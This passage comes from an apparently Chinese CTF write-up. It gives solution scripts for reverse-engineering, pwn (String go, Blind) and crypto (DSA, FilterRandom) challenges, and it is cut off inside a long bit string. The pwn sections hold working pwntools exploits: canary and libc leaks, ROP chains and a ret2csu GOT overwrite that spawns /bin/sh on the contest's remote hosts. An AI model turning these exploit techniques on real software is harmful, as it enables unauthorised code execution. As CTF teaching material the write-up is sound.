class="line"></span><br><span class="line">r = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">v = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(f)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v &gt; <span class="number">10</span>:</span><br><span class="line"></span><br><span class="line">        v = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    r.append(f[i] ^ key[v])</span><br><span class="line"></span><br><span class="line">    v += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line"></span><br><span class="line">    fout.write(r)</span><br></pre></td></tr></table></figure>



<p><img src="./20211121175536884.jpg" alt="img"></p>
<p>A_TrUe_AW_f4ns</p>
<p>出了</p>
<h3><span id></span><a href="#" class="header-anchor"></a></h3><h2><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h2><h3><span id="string-go">String go</span><a href="#string-go" class="header-anchor"></a></h3><p>简单栈溢出，通过输入-1可以泄漏canary和libc。本来想拿shell，但是为了测试于是用puts函数试着输出一下&#x2F;bin&#x2F;sh字符串，但是最后不知道怎么就把flag带出来了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./string_go&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;82.157.20.104&#x27;</span>,<span class="number">37600</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;-1+1&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recv(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sh.recv(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sh.recv(<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">sh.recv(<span class="number">2</span>+<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">sh.recv(<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(sh.recv(<span class="number">8</span>)) - (<span class="number">0x7fcd591cbbf7</span> - <span class="number">0x7fcd591aa000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;canary: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>] + libc_addr</span><br><span class="line"></span><br><span class="line">binsh =  libc_addr + <span class="number">0x00000000001b3e1a</span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x0000000000026b72</span></span><br><span class="line"></span><br><span class="line">ret = libc_addr + <span class="number">0x0000000000025679</span></span><br><span class="line"></span><br><span class="line">puts = libc_addr + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">execve = libc_addr + libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x0000000000027529</span> + libc_addr</span><br><span class="line"></span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011c371</span> + libc_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;binsh_str: &#x27;</span> + <span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;system: &#x27;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(ret)*<span class="number">2</span> + p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx_r12) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(puts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="./20211121175537028.jpg" alt="img"></p>
<h3><span id="blind">Blind</span><a href="#blind" class="header-anchor"></a></h3><p>用了alarm里的syscall，需要爆破一下1&#x2F;16</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./blind&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;82.157.6.165&#x27;</span>,<span class="number">36000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./blind&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">arg1,arg2,arg3,func</span>):</span><br><span class="line"></span><br><span class="line">        mmmc = <span class="number">0x04007A0</span></span><br><span class="line"></span><br><span class="line">        pop6_ret = <span class="number">0x4007BA</span></span><br><span class="line"></span><br><span class="line">        payload = p64(pop6_ret)</span><br><span class="line"></span><br><span class="line">        payload += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(func)+p64(arg3)+p64(arg2)+p64(arg1)</span><br><span class="line"></span><br><span class="line">        payload += p64(mmmc)+<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">alarm_got = elf.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x00601000</span> + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line">prdi_ret = <span class="number">0x4007c3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">payload += csu(<span class="number">0</span>, alarm_got, <span class="number">0x100</span>, read_got)</span><br><span class="line"></span><br><span class="line">payload += csu(<span class="number">0</span>, bss, <span class="number">0x100</span>, read_got)</span><br><span class="line"></span><br><span class="line">payload += csu(bss, <span class="number">0</span>, <span class="number">0</span>, alarm_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400753&#x27;)</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;\xd5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h2><h3><span id="dsa">DSA</span><a href="#dsa" class="header-anchor"></a></h3><p>第一层解pell方程，网上找个脚本，根据cl1，cl2的最大bit数卡一下bit求出合适的解，即ul，vl，crt一下构造多项式求m1, m2，求出m1,m2也就求出和hm1,hm2，之后g很好求，指数上用费马小定理，发现求个逆即可，pq两个方程两个未知数解一下也就求出来了，之后用s2-s1求k，剩下的就没啥了，求出x12就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line">from Crypto.Hash import SHA</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from sage.modules.free_module_integer import IntegerLattice</span><br><span class="line"></span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># def solve_pell (N , bound,  numTry = 1000):</span><br><span class="line"></span><br><span class="line">#     sols = []</span><br><span class="line"></span><br><span class="line">#     cf = continued_fraction ( sqrt ( N ))</span><br><span class="line"></span><br><span class="line">#     for i in range ( numTry ):</span><br><span class="line"></span><br><span class="line">#         denom = cf . denominator ( i )</span><br><span class="line"></span><br><span class="line">#         numer = cf . numerator ( i )</span><br><span class="line"></span><br><span class="line">#         if numer ^2 - N * denom ^2 == 1:</span><br><span class="line"></span><br><span class="line">#             if numer.nbits() in range(bound, bound+10):</span><br><span class="line"></span><br><span class="line">#                 sols.append((ZZ(numer) , ZZ(denom)))</span><br><span class="line"></span><br><span class="line">#     return sols</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wl = [3912956711, 4013184893, 3260747771]</span><br><span class="line"></span><br><span class="line">cl1 = [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424]</span><br><span class="line"></span><br><span class="line">cl2 = [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842]</span><br><span class="line"></span><br><span class="line"># sol = []</span><br><span class="line"></span><br><span class="line"># print([x.nbits() for x in cl1])</span><br><span class="line"></span><br><span class="line"># print([x.nbits() for x in cl2])</span><br><span class="line"></span><br><span class="line"># bounds = [879, 633, 866]</span><br><span class="line"></span><br><span class="line"># for i in range(3):</span><br><span class="line"></span><br><span class="line">#     sol.append(solve_pell(wl[i], bounds[i]))</span><br><span class="line"></span><br><span class="line"># print(sol)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = [[(10537190383977432819948602717449313819513015810464463348450662860435011008001132238851729268032889296600248226221086420035262540732157097949791756421026015741477785995033447663038515248071740991264311479066137102975721041822067496462240009190564238288281272874966280, 168450500310972930707208583777353845862723614274337696968629340838437927919365973736431467737825931894403582133125917579196621697175572833671789075169621831768398654909584273636143519940165648838850012943578686057625415421266321405275952938776845012046586285747)], [(121723653124334943327337351369224143389428692536182586690052931548156177466437320964701609590004825981378294358781446032392886186351422728173975231719924841105480990927174913175897972732532233, 1921455776649552079281304558665818887261070948261008212148121820969448652705855804423423681848341600084863078530401518931263150887409200101780191600802601105030806253998955929263882382004)], [(1440176324831562539183617425199117363244429114385437232965257039323873256269894716229817484088631407074328498896710966713912857642565350306252498754145253802734893404773499918668829576304890397994277568525506501428687843547083479356423917301477033624346211335450, 25220695816897075916217095856631009012504127590059436393692101250418226097323331193222730091563032067314889286051745468263446649323295355350101318199942950223572194027189199046045156046295274639977052585768365501640340023356756783359924935106074017605019787)]]</span><br><span class="line"></span><br><span class="line">ul = []</span><br><span class="line"></span><br><span class="line">vl = []</span><br><span class="line"></span><br><span class="line">for x in data:</span><br><span class="line"></span><br><span class="line">    ul.append(x[0][0])</span><br><span class="line"></span><br><span class="line">    vl.append(x[0][1])</span><br><span class="line"></span><br><span class="line">e = 7</span><br><span class="line"></span><br><span class="line">m17 = crt(cl1, ul)</span><br><span class="line"></span><br><span class="line">m27 = crt(cl2, vl)</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZZ)</span><br><span class="line"></span><br><span class="line">f = x^7 - m17</span><br><span class="line"></span><br><span class="line">m1 = int(f.roots()[0][0])</span><br><span class="line"></span><br><span class="line">g = x^7 - m27</span><br><span class="line"></span><br><span class="line">m2 = int(g.roots()[0][0])</span><br><span class="line"></span><br><span class="line">m1 = long_to_bytes(m1)</span><br><span class="line"></span><br><span class="line">m2 = long_to_bytes(m2)</span><br><span class="line"></span><br><span class="line">hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line"></span><br><span class="line">hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line"></span><br><span class="line">r1, s1, s2 = (498841194617327650445431051685964174399227739376, 376599166921876118994132185660203151983500670896, 187705159843973102963593151204361139335048329243)</span><br><span class="line"></span><br><span class="line">pq = 85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859</span><br><span class="line"></span><br><span class="line">d1 = 106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198</span><br><span class="line"></span><br><span class="line">t = 60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span><br><span class="line"></span><br><span class="line">g = inverse(t, pq)</span><br><span class="line"></span><br><span class="line">y = d1*x^2 + x - pq</span><br><span class="line"></span><br><span class="line">q = int(y.roots()[0][0])</span><br><span class="line"></span><br><span class="line">p = pq // q</span><br><span class="line"></span><br><span class="line">k = (hm2 - hm1) * inverse(s2-s1, q) % q</span><br><span class="line"></span><br><span class="line">x1 = (s1*k-hm1) * inverse(r1, q) % q</span><br><span class="line"></span><br><span class="line">r2, s3 = (620827881415493136309071302986914844220776856282, 674735360250004315267988424435741132047607535029)</span><br><span class="line"></span><br><span class="line">x2 = (s3*k-hm1) * inverse(r2, q) % q</span><br><span class="line"></span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(x1) + long_to_bytes(x2))</span><br></pre></td></tr></table></figure>



<h3><span id="filterrandom">FilterRandom</span><a href="#filterrandom" class="header-anchor"></a></h3><p>filter中每次有0.9概率从s1中选择数字，0.1概率选择s2中的数据，因此out中大部分数据都是来自于s1的。通过计算，有很大概率存在连续64个来自于s1中的数据，可以检测一下，并找到连续数字开始的下标。</p>
<p>找到连续64个比特之后，只需要一直向前回溯，就能得到初始状态init1.第一部分代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">N = 64</span><br><span class="line"></span><br><span class="line">class lfsr():</span><br><span class="line"></span><br><span class="line">    def __init__(self, init, mask, length):</span><br><span class="line"></span><br><span class="line">        self.init = init</span><br><span class="line"></span><br><span class="line">        self.mask = mask</span><br><span class="line"></span><br><span class="line">        self.lengthmask = 2**length-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def next(self):</span><br><span class="line"></span><br><span class="line">        nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask </span><br><span class="line"></span><br><span class="line">        i = self.init &amp; self.mask &amp; self.lengthmask </span><br><span class="line"></span><br><span class="line">        output = 0</span><br><span class="line"></span><br><span class="line">        while i != 0:</span><br><span class="line"></span><br><span class="line">            output ^= (i &amp; 1)</span><br><span class="line"></span><br><span class="line">            i = i &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">        nextdata ^= output</span><br><span class="line"></span><br><span class="line">        self.init = nextdata</span><br><span class="line"></span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def backtrace(state, mask):</span><br><span class="line"></span><br><span class="line">    mask = ((mask &amp; 0x7FFFFFFFFFFFFFFF) &lt;&lt; 1) + 1</span><br><span class="line"></span><br><span class="line">    i = state &amp; mask</span><br><span class="line"></span><br><span class="line">    output = 0</span><br><span class="line"></span><br><span class="line">    while i != 0:</span><br><span class="line"></span><br><span class="line">        output ^= (i &amp; 1)</span><br><span class="line"></span><br><span class="line">        i = i &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">    state &gt;&gt;= 1</span><br><span class="line"></span><br><span class="line">    return (output &lt;&lt; 63) + state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">output = &quot;1000101101010001100010010100101110001011011100110000111000011101101110010110110100011110110001011110001100001111111101010111110010101010110001010000011101101001111011100010000010110010101011010011110001100010101010101101111101101100000110100101100001000001111000111100111101110011001111111110100011110100101000011000111011110100100110101110110100101000110101001011000000000000100110110010101111001101011001101011011001100100111100101010001111011110010001011011110011001000000001001001111000110000001100000111000100000001000010010010110000001110000001111010100101101001101010000110100001010010000001100101100100011000000000011101110100011001011011111001010111001000101000111111100001101000001100111011100100001001100000011101011110000010001001100111110111011010010001111100011100001111110101001011001111110001000010010101100000101010111110111100100001110111100011100010101101011110011000101101110010100101011011011011001110010011110011000110111001010001011110000011000001011010001000110001101100110010011010111001010001110111011001000001001110000001110000010101001101111111000010000001000101011101101111111010011110001110001111011001000101110111100101110101011011100100100011100100111100111111011111110000111110010011001111111011010100001101011111001000110000011110001001110001101000010101011101010110100001100111001100000011011011000110110011010111001001011101110011010100011000001100101010000011000000000111001000101000100110111110000111111101101001001110011001000011101000100111111111000001010111001101010010010110110011100001011010011001000101011011111001100011101110111010001000011011011001100101111101111100000000000000111000000100001100011011100000011010011011000111101111110001001001110010101000011100001111101000000101001001110101001011001100000000111111000000001011101100001000111100010011010111000100001111100110111111110001111101100100111000010100110111010011101001101110100011001000000100100000110011000111010110000100011010010001011110110001010011001111101001110010000110